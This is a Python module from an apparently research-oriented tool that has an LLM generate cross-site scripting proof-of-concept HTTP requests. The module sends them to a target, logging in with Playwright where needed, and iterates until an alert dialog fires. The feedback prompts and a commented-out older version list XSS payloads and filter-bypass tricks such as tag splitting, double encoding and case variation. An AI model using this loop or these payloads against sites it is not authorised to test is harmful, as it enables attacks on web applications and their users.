from __future__ import annotations

from datetime import datetime
from pathlib import Path
import time
from typing import List, Optional

from rich.console import Console

from PoCGen.config.config import SETTINGS
from PoCGen.llm.client import ChatMessage, LLMClient
from PoCGen.prompts.templates import build_prompt_cross_site_scripting_http
from PoCGen.core.sampler import sample_target_with_playwright
from PoCGen.core.target_profile import TargetSample
from PoCGen.tools.getWeb import get_web_infomation
from PoCGen.core.xss_detector import XSSDetector
from PoCGen.core.models import (
    AttemptResult,
    GenerationResult,
    HTTPMessage,
    ValidationResult,
    VulnHandler,
)
from .postprocess import save_messages, split_messages
from .validators import parse_and_validate
from .remote_validator import validate_http_requests

console = Console()


class CrossSiteScriptingHTTPHandler(VulnHandler):
    name = "cross_site_scripting_http"

    def build_messages(
        self,
        description: str,
        code_texts: List[str],
        target: Optional[str],
        attacker_url: str,
        target_profile: Optional[str] = None,
        validation_feedback: Optional[str] = None,
    ) -> List[dict]:
        msgs = build_prompt_cross_site_scripting_http(
            description=description,
            code_files=code_texts,
            target=target,
            attacker_url=attacker_url,
            target_profile=target_profile,
            validation_feedback=validation_feedback,
        )
        return [m.model_dump() for m in msgs]


def generate_cross_site_scripting_http(
    description: str,
    code_texts: List[str],
    target: Optional[str] = None,
    vuln_type: Optional[str] = None,
    temperature: float = 0.2,
    max_tokens: int = 4000,
    payload: Optional[str] = None,
    attacker_url: Optional[str] = None,
    probe_target: bool = False,
    auto_validate: bool = False,
    max_iterations: Optional[int] = None,
    stop_on_success: Optional[bool] = None,
    monitor_timeout: Optional[float] = None,
    cvenumber: Optional[str] = None,
    login_url: Optional[str] = None,
    login_username: Optional[str] = None,
    login_password: Optional[str] = None,
    login_user_field: str = "username",
    login_pass_field: str = "password",
    use_browser_login: bool = False,
    browser_headless: Optional[bool] = None,
) -> GenerationResult:
    handler_key = vuln_type or CrossSiteScriptingHTTPHandler.name
    handler = CrossSiteScriptingHTTPHandler()
    
    if cvenumber:
        get_web_infomation(cvenumber)

    chat_log_dir = Path(__file__).resolve().parent.parent.parent.parent / "logs" / "chat"
    chat_log_dir.mkdir(parents=True, exist_ok=True)
    chat_log_path = chat_log_dir / f"chat_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

    def log_chat(text: str) -> None:
        try:
            ts = datetime.now().isoformat(timespec="seconds")
            with open(chat_log_path, "a", encoding="utf-8") as fh:
                fh.write(f"[{ts}] {text}\n")
        except Exception:
            pass

    log_chat(
        "Initial input for XSS HTTP PoC Generation:\n"
        f"description: {description}\n"
        f"target: {target or '<none>'}\n"
        f"vuln_type: {handler_key}\n"
    )

    max_iters = max(1, max_iterations or SETTINGS.max_iterations)
    if not auto_validate:
        max_iters = 1
    stop_after_success = SETTINGS.stop_on_success if stop_on_success is None else stop_on_success
    out_dir = SETTINGS.save_dir
    attempts: List[AttemptResult] = []
    feedback_text: Optional[str] = None
    overall_success = False
    last_raw_output = ""
    last_requests: List[HTTPMessage] = []
    last_saved_paths: List[str] = []
    last_validation_results: Optional[List[ValidationResult]] = None

    xss_detector: Optional[XSSDetector] = None
    if auto_validate and target:
        xss_detector = XSSDetector()
        console.print("[cyan]XSS detection mode: will look for alert dialogs in browser[/cyan]")
    
    conversation_messages: List[ChatMessage] = [ChatMessage(**m) for m in handler.build_messages(
        description,
        code_texts,
        target,
        "",
        None,
        None,
    )]

    generation_start_ts = time.time()

    try:
        target_profile_block: Optional[str] = None
        sample_cookies_header: Optional[str] = None
        if probe_target and target:
            if use_browser_login:
                try:
                    sample: TargetSample = sample_target_with_playwright(
                        target,
                        login_url=login_url,
                        login_username=login_username,
                        login_password=login_password,
                        login_user_field=login_user_field,
                        login_pass_field=login_pass_field,
                        headless=browser_headless,
                        capture_posts=True,
                        capture_cookies=True,
                        capture_socket_messages=False,
                    )
                    target_profile_block = sample.as_prompt_block()
                    sample_cookies_header = sample.cookies_header
                except Exception as exc:
                    console.print(f"[yellow]Warning: failed to probe target {target}: {exc}")
            else:
                console.print("[yellow]probe_target currently requires --browser-login; skipping target sampling")

        for attempt_index in range(max_iters):
            console.print(f"\n[bold]Attempt {attempt_index + 1}/{max_iters} for Cross-Site Scripting[/bold]")

            log_chat(f"Attempt {attempt_index + 1} starting")
            if feedback_text:
                log_chat(f"Feedback provided to model:\n{feedback_text}")

            messages: List[ChatMessage] = list(conversation_messages)
            if target_profile_block:
                messages.append(ChatMessage(role="user", content=f"Updated target profile:\n{target_profile_block}"))
            if feedback_text:
                messages.append(ChatMessage(role="user", content=f"Feedback from previous attempt:\n{feedback_text}"))

            log_chat(
                "Model input messages:\n" +
                "\n".join(f"- {m.role}: {m.content}" for m in messages)
            )

            client = LLMClient()
            try:
                raw_output = client.chat(messages, temperature=temperature, max_tokens=max_tokens)
            finally:
                client.close()

            conversation_messages.append(ChatMessage(role="assistant", content=raw_output))
            log_chat("Model output:\n" + raw_output)

            raw_messages = split_messages(raw_output)
            if not raw_messages and raw_output.strip():
                raw_messages = [raw_output.strip()]

            if raw_messages:
                saved_paths = save_messages(raw_messages, out_dir)
                console.print(
                    f"Saved {len(saved_paths)} PoC request(s) to: {out_dir}"
                )
            else:
                saved_paths = []
                console.print(
                    f"[yellow]Attempt {attempt_index + 1} produced no parseable HTTP request"
                )

            requests: List[HTTPMessage] = []
            parse_issues: List[str] = []
            for idx, raw in enumerate(raw_messages):
                try:
                    msg, errs = parse_and_validate(raw)
                    requests.append(msg)
                    if errs:
                        for err in errs:
                            parse_issues.append(f"Request #{idx}: {err}")
                except Exception as exc:
                    parse_issues.append(f"Request #{idx} parse error: {exc}")
                    requests.append(HTTPMessage(method="", path="", version="", headers={}, body=raw))

            validation_results: Optional[List[ValidationResult]] = None
            validation_error: Optional[str] = None
            xss_success = False
            xss_summary: Optional[str] = None
            
            if auto_validate and target and requests and xss_detector:
                if sample_cookies_header:
                    for req in requests:
                        if "Cookie" not in req.headers:
                            req.headers["Cookie"] = sample_cookies_header
                try:
                    validation_results = validate_http_requests(requests, target)
                    for res in validation_results:
                        if res.success:
                            console.print(
                                f"[green]Request #{res.request_index} -> HTTP {res.status_code} ({res.url})"
                            )
                            
                            # 检测XSS弹窗
                            if res.status_code in [200, 201, 202, 302]:
                                console.print(f"[cyan]Checking for XSS in response of request #{res.request_index}...[/cyan]")
                                xss_found, summary = xss_detector.detect_xss(res.url or target, res.response_body or "")
                                if xss_found:
                                    console.print(f"[bold green]XSS detected! {summary}[/bold green]")
                                    xss_success = True
                                    xss_summary = summary
                                else:
                                    console.print(f"[yellow]No XSS detected in response[/yellow]")
                        else:
                            detail = res.error or (f"HTTP {res.status_code}" if res.status_code else "no response")
                            preview = (res.response_preview or "").strip()
                            if preview:
                                preview = preview[:200] + ("..." if len(preview) > 200 else "")
                                detail += f" | body: {preview}"
                            console.print(
                                f"[yellow]Request #{res.request_index} validation failed ({detail})"
                            )
                except Exception as exc:
                    console.print(f"[yellow]Warning: validation failed: {exc}")
                    validation_results = None
                    validation_error = str(exc)

            feedback_for_next = None
            if not xss_success:
                feedback_for_next = _build_xss_attempt_feedback(
                    parse_issues,
                    validation_results,
                    validation_error,
                )

            attempts.append(
                AttemptResult(
                    attempt_index=attempt_index,
                    raw_output=raw_output,
                    requests=requests,
                    saved_paths=saved_paths,
                    validation_results=validation_results,
                    monitor_hit=xss_success,
                    monitor_summary=xss_summary,
                    feedback=feedback_for_next,
                )
            )

            last_raw_output = raw_output
            last_requests = requests
            last_saved_paths = saved_paths
            last_validation_results = validation_results
            overall_success = overall_success or xss_success
            feedback_text = feedback_for_next

            if xss_success and stop_after_success:
                console.print("[bold green]XSS detected! Stopping further attempts.[/bold green]")
                break

            if attempt_index + 1 < max_iters:
                if feedback_text:
                    console.print("[cyan]Prepared feedback for next attempt (feedback logged, not printed to console)")
                elif not xss_success:
                    console.print("[yellow]No specific feedback generated; will request model to adjust strategy")

        return GenerationResult(
            raw_output=last_raw_output,
            requests=last_requests,
            saved_paths=last_saved_paths,
            validation_results=last_validation_results,
            attempts=attempts,
            success=overall_success,
        )
    finally:
        if xss_detector:
            xss_detector.close()


def _build_xss_attempt_feedback(
    parse_issues: List[str],
    validation_results: Optional[List[ValidationResult]],
    validation_error: Optional[str] = None,
) -> Optional[str]:
    messages: List[str] = []
    if parse_issues:
        bullet = "\n".join(f"- {issue}" for issue in parse_issues)
        messages.append("Local HTTP parsing/validation issues detected:\n" + bullet)

    validation_summaries: List[str] = []
    failed_validation: List[ValidationResult] = []
    if validation_results is not None:
        for res in validation_results:
            status = f"HTTP {res.status_code}" if res.status_code is not None else "no status"
            url = res.url or "<no url>"
            preview = (res.response_preview or "").strip()
            if preview:
                preview = preview[:200] + ("..." if len(preview) > 200 else "")
            detail_parts: List[str] = []
            if res.error:
                detail_parts.append(res.error)
            if preview:
                detail_parts.append(f"body: {preview}")
            detail = "; ".join(detail_parts)

            if res.success:
                line = f"Request #{res.request_index}: success -> {status} ({url})"
            else:
                failed_validation.append(res)
                line = f"Request #{res.request_index}: failure -> {status} ({url})"
                if not detail:
                    detail = "no response"
            if detail:
                line += f"; {detail}"
            validation_summaries.append(line)

        if validation_summaries:
            messages.append("Target validation summary:\n" + "\n".join(f"- {item}" for item in validation_summaries))

    elif validation_error:
        messages.append(f"Target validation did not run due to error: {validation_error}")
    else:
        messages.append("Target validation did not run or returned no results.")

    messages.append(
        "No XSS alert detected. Adjust along the following tracks before the next attempt:\n"
        "1) Payload Construction: Use classic XSS payloads like `<svg/onload=alert()>`, `<img src=x onerror=alert()>`, or `<script>alert()</script>`.\n"
        "2) Context Awareness: If payload appears in response but doesn't execute, check if it's properly placed in HTML context (not inside attributes or JavaScript strings).\n"
        "3) Encoding: Try different encodings (HTML entities, URL encoding) to bypass filters.\n"
        "4) Event Handlers: Try different event handlers: onload, onerror, onmouseover, onclick.\n"
        "5) Tag Variation: Use different HTML tags: svg, img, div, a, iframe.\n"
        "6) Sanitization Bypass: If payload is filtered, try techniques like `<scr<script>ipt>alert()</scr<script>ipt>`."
    )

    return "\n\n".join(messages) if messages else None


# from __future__ import annotations

# from datetime import datetime
# from pathlib import Path
# import time
# import json
# import re
# from typing import List, Optional, Dict, Any, Tuple
# from rich.console import Console

# from PoCGen.config.config import SETTINGS
# from PoCGen.llm.client import ChatMessage, LLMClient
# from PoCGen.prompts.templates import build_prompt_cross_site_scripting_http
# from PoCGen.core.sampler import sample_target_with_playwright
# from PoCGen.core.target_profile import TargetSample
# from PoCGen.tools.getWeb import get_web_infomation
# from PoCGen.core.xss_detector import XSSDetector
# from PoCGen.core.models import (
#     AttemptResult,
#     GenerationResult,
#     HTTPMessage,
#     ValidationResult,
#     VulnHandler,
# )
# from .postprocess import save_messages, split_messages
# from .validators import parse_and_validate
# from .remote_validator import validate_http_requests

# console = Console()


# class CrossSiteScriptingHTTPHandler(VulnHandler):
#     name = "cross_site_scripting_http"

#     def build_messages(
#         self,
#         description: str,
#         code_texts: List[str],
#         target: Optional[str],
#         attacker_url: str,
#         target_profile: Optional[str] = None,
#         validation_feedback: Optional[str] = None,
#     ) -> List[dict]:
#         msgs = build_prompt_cross_site_scripting_http(
#             description=description,
#             code_files=code_texts,
#             target=target,
#             attacker_url=attacker_url,
#             target_profile=target_profile,
#             validation_feedback=validation_feedback,
#         )
#         return [m.model_dump() for m in msgs]


# def generate_cross_site_scripting_http(
#     description: str,
#     code_texts: List[str],
#     target: Optional[str] = None,
#     vuln_type: Optional[str] = None,
#     temperature: float = 0.2,
#     max_tokens: int = 4000,
#     attacker_url: Optional[str] = None,
#     probe_target: bool = False,
#     auto_validate: bool = False,
#     max_iterations: Optional[int] = None,
#     stop_on_success: Optional[bool] = None,
#     monitor_timeout: Optional[float] = None,
#     cvenumber: Optional[str] = None,
#     login_url: Optional[str] = None,
#     login_username: Optional[str] = None,
#     login_password: Optional[str] = None,
#     login_user_field: str = "username",
#     login_pass_field: str = "password",
#     use_browser_login: bool = False,
#     browser_headless: Optional[bool] = None,
# ) -> GenerationResult:
#     handler_key = vuln_type or CrossSiteScriptingHTTPHandler.name
#     handler = CrossSiteScriptingHTTPHandler()
    
#     if cvenumber:
#         get_web_infomation(cvenumber)

#     chat_log_dir = Path(__file__).resolve().parent.parent.parent.parent / "logs" / "chat"
#     chat_log_dir.mkdir(parents=True, exist_ok=True)
#     chat_log_path = chat_log_dir / f"chat_{datetime.now().strftime('%Y%m%d_%H%M%S')}.log"

#     def log_chat(text: str) -> None:
#         try:
#             ts = datetime.now().isoformat(timespec="seconds")
#             with open(chat_log_path, "a", encoding="utf-8") as fh:
#                 fh.write(f"[{ts}] {text}\n")
#         except Exception:
#             pass

#     log_chat(
#         "Initial input for XSS HTTP PoC Generation:\n"
#         f"description: {description}\n"
#         f"target: {target or '<none>'}\n"
#         f"vuln_type: {handler_key}\n"
#     )

#     max_iters = max(1, max_iterations or SETTINGS.max_iterations)
#     if not auto_validate:
#         max_iters = 1
#     stop_after_success = SETTINGS.stop_on_success if stop_on_success is None else stop_on_success
#     out_dir = SETTINGS.save_dir
#     attempts: List[AttemptResult] = []
#     feedback_text: Optional[str] = None
#     overall_success = False
#     last_raw_output = ""
#     last_requests: List[HTTPMessage] = []
#     last_saved_paths: List[str] = []
#     last_validation_results: Optional[List[ValidationResult]] = None

#     xss_detector: Optional[XSSDetector] = None
#     if auto_validate and target:
#         xss_detector = XSSDetector()
#         console.print("[cyan]XSS detection mode: will look for alert dialogs in browser[/cyan]")
    
#     conversation_messages: List[ChatMessage] = [ChatMessage(**m) for m in handler.build_messages(
#         description,
#         code_texts,
#         target,
#         "",
#         None,
#         None,
#     )]

#     generation_start_ts = time.time()

#     try:
#         target_profile_block: Optional[str] = None
#         sample_cookies_header: Optional[str] = None
#         if probe_target and target:
#             if use_browser_login:
#                 try:
#                     sample: TargetSample = sample_target_with_playwright(
#                         target,
#                         login_url=login_url,
#                         login_username=login_username,
#                         login_password=login_password,
#                         login_user_field=login_user_field,
#                         login_pass_field=login_pass_field,
#                         headless=browser_headless,
#                         capture_posts=True,
#                         capture_cookies=True,
#                         capture_socket_messages=False,
#                     )
#                     target_profile_block = sample.as_prompt_block()
#                     sample_cookies_header = sample.cookies_header
#                 except Exception as exc:
#                     console.print(f"[yellow]Warning: failed to probe target {target}: {exc}")
#             else:
#                 console.print("[yellow]probe_target currently requires --browser-login; skipping target sampling")

#         for attempt_index in range(max_iters):
#             console.print(f"\n[bold]Attempt {attempt_index + 1}/{max_iters} for Cross-Site Scripting[/bold]")

#             log_chat(f"Attempt {attempt_index + 1} starting")
#             if feedback_text:
#                 log_chat(f"Feedback provided to model:\n{feedback_text}")

#             messages: List[ChatMessage] = list(conversation_messages)
#             if target_profile_block:
#                 messages.append(ChatMessage(role="user", content=f"Updated target profile:\n{target_profile_block}"))
#             if feedback_text:
#                 messages.append(ChatMessage(role="user", content=f"Feedback from previous attempt:\n{feedback_text}"))

#             log_chat(
#                 "Model input messages:\n" +
#                 "\n".join(f"- {m.role}: {m.content}" for m in messages)
#             )

#             client = LLMClient()
#             try:
#                 raw_output = client.chat(messages, temperature=temperature, max_tokens=max_tokens)
#             finally:
#                 client.close()

#             conversation_messages.append(ChatMessage(role="assistant", content=raw_output))
#             log_chat("Model output:\n" + raw_output)

#             raw_messages = split_messages(raw_output)
#             if not raw_messages and raw_output.strip():
#                 raw_messages = [raw_output.strip()]

#             if raw_messages:
#                 saved_paths = save_messages(raw_messages, out_dir)
#                 console.print(
#                     f"Saved {len(saved_paths)} PoC request(s) to: {out_dir}"
#                 )
#             else:
#                 saved_paths = []
#                 console.print(
#                     f"[yellow]Attempt {attempt_index + 1} produced no parseable HTTP request"
#                 )

#             requests: List[HTTPMessage] = []
#             parse_issues: List[str] = []
#             for idx, raw in enumerate(raw_messages):
#                 try:
#                     msg, errs = parse_and_validate(raw)
#                     requests.append(msg)
#                     if errs:
#                         for err in errs:
#                             parse_issues.append(f"Request #{idx}: {err}")
#                 except Exception as exc:
#                     parse_issues.append(f"Request #{idx} parse error: {exc}")
#                     requests.append(HTTPMessage(method="", path="", version="", headers={}, body=raw))

#             validation_results: Optional[List[ValidationResult]] = None
#             validation_error: Optional[str] = None
#             xss_success = False
#             xss_summary: Optional[str] = None
            
#             if auto_validate and target and requests and xss_detector:
#                 if sample_cookies_header:
#                     for req in requests:
#                         if "Cookie" not in req.headers:
#                             req.headers["Cookie"] = sample_cookies_header
#                 try:
#                     validation_results = validate_http_requests(requests, target)
                    
#                     # 记录所有成功响应的URL
#                     successful_urls = []
#                     for res in validation_results:
#                         if res.success:
#                             console.print(
#                                 f"[green]Request #{res.request_index} -> HTTP {res.status_code} ({res.url})"
#                             )
#                             successful_urls.append(res.url or target)
                            
#                             # 检测XSS弹窗 - 基本检测
#                             if res.status_code in [200, 201, 202, 302]:
#                                 console.print(f"[cyan]Checking for XSS in response of request #{res.request_index}...[/cyan]")
                                
#                                 # 方法1: 基本检测 - 直接检查响应体
#                                 if res.response_body:
#                                     xss_found, summary = xss_detector.detect_xss(res.url or target, res.response_body)
#                                     if xss_found:
#                                         console.print(f"[bold green]XSS detected! {summary}[/bold green]")
#                                         xss_success = True
#                                         xss_summary = summary
#                                     else:
#                                         console.print(f"[yellow]No XSS detected in response[/yellow]")
                                        
#                                 # 方法2: 如果没有响应体，或者基本检测失败，尝试直接访问URL
#                                 else:
#                                     console.print(f"[cyan]No response body, trying direct URL access...[/cyan]")
#                                     xss_found, summary = xss_detector.detect_xss(res.url or target)
#                                     if xss_found:
#                                         console.print(f"[bold green]XSS detected! {summary}[/bold green]")
#                                         xss_success = True
#                                         xss_summary = summary
#                                     else:
#                                         console.print(f"[yellow]No XSS detected via direct access[/yellow]")
#                         else:
#                             detail = res.error or (f"HTTP {res.status_code}" if res.status_code else "no response")
#                             preview = (res.response_preview or "").strip()
#                             if preview:
#                                 preview = preview[:200] + ("..." if len(preview) > 200 else "")
#                                 detail += f" | body: {preview}"
#                             console.print(
#                                 f"[yellow]Request #{res.request_index} validation failed ({detail})"
#                             )
                    
#                     # 如果基本检测都失败，尝试更高级的检测方法
#                     if not xss_success and successful_urls:
#                         console.print("[cyan]Trying advanced XSS detection with request/response modification...[/cyan]")
                        
#                         # 尝试不同的XSS payloads
#                         advanced_xss_payloads = [
#                             "<svg/onload=alert()>",
#                             "<img src=x onerror=alert()>",
#                             "<script>alert()</script>",
#                             "<body onload=alert()>",
#                             "'\"><script>alert()</script>",
#                             "<iframe onload=alert()>",
#                             "<input onfocus=alert() autofocus>",
#                             "<details open ontoggle=alert()>",
#                             "<svg><animate onbegin=alert() attributeName=x dur=1s>"
#                         ]
                        
#                         for url in successful_urls:
#                             for payload in advanced_xss_payloads[:3]:  # 只尝试前3个payloads
#                                 console.print(f"[cyan]Testing payload: {payload[:30]}...[/cyan]")
                                
#                                 # 创建响应修改器函数
#                                 def create_response_modifier(payload_to_inject: str):
#                                     def response_modifier(original_body: str) -> str:
#                                         # 简单的响应注入策略
#                                         if "</body>" in original_body.lower():
#                                             return original_body.replace("</body>", f"{payload_to_inject}</body>")
#                                         elif "</html>" in original_body.lower():
#                                             return original_body.replace("</html>", f"{payload_to_inject}</html>")
#                                         else:
#                                             return original_body + payload_to_inject
#                                     return response_modifier
                                
#                                 # 尝试响应修改检测
#                                 xss_found, summary = xss_detector.detect_xss_with_response_modification(
#                                     url, 
#                                     create_response_modifier(payload)
#                                 )
                                
#                                 if xss_found:
#                                     console.print(f"[bold green]XSS detected with response modification! {summary}[/bold green]")
#                                     xss_success = True
#                                     xss_summary = f"Response modification: {summary}"
#                                     break
                            
#                             if xss_success:
#                                 break
                                
#                         # 如果还是失败，尝试请求修改
#                         if not xss_success:
#                             console.print("[cyan]Trying request modification detection...[/cyan]")
                            
#                             # 创建简单的请求修改规则
#                             modify_rules = [
#                                 {
#                                     "type": "param",
#                                     "match": {"url_pattern": ".*", "method": "GET"},
#                                     "action": "set",
#                                     "key": "test",
#                                     "value": "<svg/onload=alert()>"
#                                 }
#                             ]
                            
#                             for url in successful_urls:
#                                 xss_found, summary, intercepted_requests = xss_detector.detect_xss_with_request_modification(
#                                     url, 
#                                     modify_rules
#                                 )
                                
#                                 if xss_found:
#                                     console.print(f"[bold green]XSS detected with request modification! {summary}[/bold green]")
#                                     console.print(f"[dim]Intercepted {len(intercepted_requests)} requests[/dim]")
#                                     xss_success = True
#                                     xss_summary = f"Request modification: {summary}"
#                                     break
                    
#                 except Exception as exc:
#                     console.print(f"[yellow]Warning: validation failed: {exc}")
#                     validation_results = None
#                     validation_error = str(exc)

#             feedback_for_next = None
#             if not xss_success:
#                 feedback_for_next = _build_xss_attempt_feedback(
#                     parse_issues,
#                     validation_results,
#                     validation_error,
#                 )

#             attempts.append(
#                 AttemptResult(
#                     attempt_index=attempt_index,
#                     raw_output=raw_output,
#                     requests=requests,
#                     saved_paths=saved_paths,
#                     validation_results=validation_results,
#                     monitor_hit=xss_success,
#                     monitor_summary=xss_summary,
#                     feedback=feedback_for_next,
#                 )
#             )

#             last_raw_output = raw_output
#             last_requests = requests
#             last_saved_paths = saved_paths
#             last_validation_results = validation_results
#             overall_success = overall_success or xss_success
#             feedback_text = feedback_for_next

#             if xss_success and stop_after_success:
#                 console.print("[bold green]XSS detected! Stopping further attempts.[/bold green]")
#                 break

#             if attempt_index + 1 < max_iters:
#                 if feedback_text:
#                     console.print("[cyan]Prepared feedback for next attempt (feedback logged, not printed to console)")
#                 elif not xss_success:
#                     console.print("[yellow]No specific feedback generated; will request model to adjust strategy")

#         return GenerationResult(
#             raw_output=last_raw_output,
#             requests=last_requests,
#             saved_paths=last_saved_paths,
#             validation_results=last_validation_results,
#             attempts=attempts,
#             success=overall_success,
#         )
#     finally:
#         if xss_detector:
#             xss_detector.close()


# def _build_xss_attempt_feedback(
#     parse_issues: List[str],
#     validation_results: Optional[List[ValidationResult]],
#     validation_error: Optional[str] = None,
# ) -> Optional[str]:
#     """构建XSS漏洞的迭代反馈信息"""
#     messages: List[str] = []
#     if parse_issues:
#         bullet = "\n".join(f"- {issue}" for issue in parse_issues)
#         messages.append("Local HTTP parsing/validation issues detected:\n" + bullet)

#     validation_summaries: List[str] = []
#     failed_validation: List[ValidationResult] = []
#     if validation_results is not None:
#         for res in validation_results:
#             status = f"HTTP {res.status_code}" if res.status_code is not None else "no status"
#             url = res.url or "<no url>"
#             preview = (res.response_preview or "").strip()
#             if preview:
#                 preview = preview[:200] + ("..." if len(preview) > 200 else "")
#             detail_parts: List[str] = []
#             if res.error:
#                 detail_parts.append(res.error)
#             if preview:
#                 detail_parts.append(f"body: {preview}")
#             detail = "; ".join(detail_parts)

#             if res.success:
#                 line = f"Request #{res.request_index}: success -> {status} ({url})"
#             else:
#                 failed_validation.append(res)
#                 line = f"Request #{res.request_index}: failure -> {status} ({url})"
#                 if not detail:
#                     detail = "no response"
#             if detail:
#                 line += f"; {detail}"
#             validation_summaries.append(line)

#         if validation_summaries:
#             messages.append("Target validation summary:\n" + "\n".join(f"- {item}" for item in validation_summaries))

#     elif validation_error:
#         messages.append(f"Target validation did not run due to error: {validation_error}")
#     else:
#         messages.append("Target validation did not run or returned no results.")

#     # 详细的XSS反馈指导
#     messages.append(
#         "No XSS alert detected. Try the following strategies:\n\n"
        
#         "1) **Basic Payloads**:\n"
#         "   - `<svg/onload=alert()>`\n"
#         "   - `<img src=x onerror=alert()>`\n"
#         "   - `<script>alert()</script>`\n"
#         "   - `<body onload=alert()>`\n\n"
        
#         "2) **Context-Specific Payloads**:\n"
#         "   - **HTML Context**: Basic tags work\n"
#         "   - **Attribute Context**: `\" onmouseover=alert() x=\"`\n"
#         "   - **JavaScript Context**: `';alert();//` or `\\\";alert();//`\n"
#         "   - **URL Context**: `javascript:alert()`\n\n"
        
#         "3) **Bypass Techniques**:\n"
#         "   - **Encoding**: HTML entities, URL encoding\n"
#         "   - **Case Variation**: `<ScRiPt>alert()</ScRiPt>`\n"
#         "   - **Double Encoding**: `%253Cscript%253Ealert()%253C/script%253E`\n"
#         "   - **Tag Splitting**: `<scr<script>ipt>alert()</scr<script>ipt>`\n"
#         "   - **Null Bytes**: `<script>alert()</script>`\n\n"
        
#         "4) **Advanced Payloads**:\n"
#         "   - SVG with animation: `<svg><animate onbegin=alert() attributeName=x dur=1s>`\n"
#         "   - Details tag: `<details open ontoggle=alert()>`\n"
#         "   - Input autofocus: `<input onfocus=alert() autofocus>`\n"
#         "   - Marquee: `<marquee onstart=alert()>`\n\n"
        
#         "5) **Request/Response Manipulation**:\n"
#         "   - Try modifying HTTP headers (X-Forwarded-Host, Referer, etc.)\n"
#         "   - Add or modify parameters in both GET and POST requests\n"
#         "   - Test JSON payloads with XSS in string values\n"
#         "   - Try multipart/form-data with XSS in file names or fields\n\n"
        
#         "6) **Detection Strategy**:\n"
#         "   - Check if payload appears in response (even if not executed)\n"
#         "   - Look for reflection points in HTML, JavaScript, comments\n"
#         "   - Try DOM-based XSS payloads that don't require server reflection\n"
#         "   - Test with different Content-Type headers"
#     )

#     return "\n\n".join(messages) if messages else None


# def _analyze_response_for_xss_reflection(
#     response_body: str, 
#     original_payload: Optional[str] = None
# ) -> Dict[str, Any]:
#     """
#     分析响应中XSS payload的反射情况
    
#     Args:
#         response_body: HTTP响应体
#         original_payload: 原始注入的payload
        
#     Returns:
#         包含分析结果的字典
#     """
#     result = {
#         "payload_reflected": False,
#         "reflection_context": None,
#         "reflection_points": [],
#         "potential_contexts": []
#     }
    
#     if not response_body or not original_payload:
#         return result
    
#     # 清理payload用于搜索
#     clean_payload = re.sub(r'[<>"\']', '', original_payload)
#     if len(clean_payload) < 5:  # 太短的payload不适合搜索
#         return result
    
#     # 检查payload是否在响应中反射
#     if clean_payload in response_body:
#         result["payload_reflected"] = True
        
#         # 找到反射点
#         for match in re.finditer(re.escape(clean_payload), response_body):
#             start = max(0, match.start() - 50)
#             end = min(len(response_body), match.end() + 50)
#             context = response_body[start:end]
            
#             result["reflection_points"].append({
#                 "position": match.start(),
#                 "context": context
#             })
    
#     # 分析可能的上下文
#     contexts_to_check = [
#         ("html_tag", r'<[^>]*%s[^>]*>', "Inside HTML tag"),
#         ("html_attribute", r'[a-z]+="[^"]*%s[^"]*"', "Inside HTML attribute"),
#         ("javascript", r'<script[^>]*>.*%s.*</script>', "Inside JavaScript"),
#         ("comment", r'<!--.*%s.*-->', "Inside HTML comment"),
#         ("url", r'https?://[^\s]*%s[^\s]*', "Inside URL"),
#     ]
    
#     for context_name, pattern, description in contexts_to_check:
#         try:
#             if re.search(pattern % re.escape(clean_payload), response_body, re.IGNORECASE | re.DOTALL):
#                 result["potential_contexts"].append(description)
#         except:
#             continue
    
#     return result